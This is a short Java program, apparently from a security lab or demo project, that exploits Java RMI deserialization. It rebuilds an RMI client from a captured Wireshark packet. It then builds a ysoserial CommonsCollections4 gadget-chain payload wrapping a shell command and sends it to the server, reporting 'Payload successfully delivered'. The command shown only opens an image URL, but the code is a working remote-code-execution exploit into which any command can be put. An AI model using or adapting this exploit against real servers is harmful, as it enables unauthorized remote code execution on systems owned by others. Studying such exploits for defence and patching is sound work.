package rmi.client;

import ysoserial.payloads.CommonsCollections4;

import java.io.Serializable;

public class CommonCollections4Exploit {

    public static void main(String[] args) {
        String packet  = "02000000450000a800004000400600007f0000017f000001f3a8f3a077b4fd6540a5e3b2801818e6fe9c00000101080a020f4d8e59e50a6d50aced00057722eeaa22345f3ba1519f5034f100000179ec7080638001ffffffff0a215d96fefebc2b73720012726d692e636f6d6d6f6e2e52657175657374a5cf47db57c09a220200014c00076d6573736167657400124c6a6176612f6c616e672f537472696e673b707870740005776f726c64";

        String command = "python -m webbrowser https://i.imgflip.com/2v6xla.jpg";
        try {
            // Get WireShark packet data: Right click > ...as a Hex Stream
            MaliciousClient client = MaliciousClient.fromPacket(packet);
            client.printInfo();

            // Construct a payload
            Object payload = new CommonsCollections4().getObject(command);

            // Send payload
            try {
                client.sendObject((Serializable) payload);
            } catch (org.apache.commons.collections4.FunctorException e) {
                // expected
            }

            // Report success
            System.out.println("Payload successfully delivered");
        } catch (Exception e) {
            System.err.println("Client exception: " + e.toString());
            e.printStackTrace();
        }
    }
}
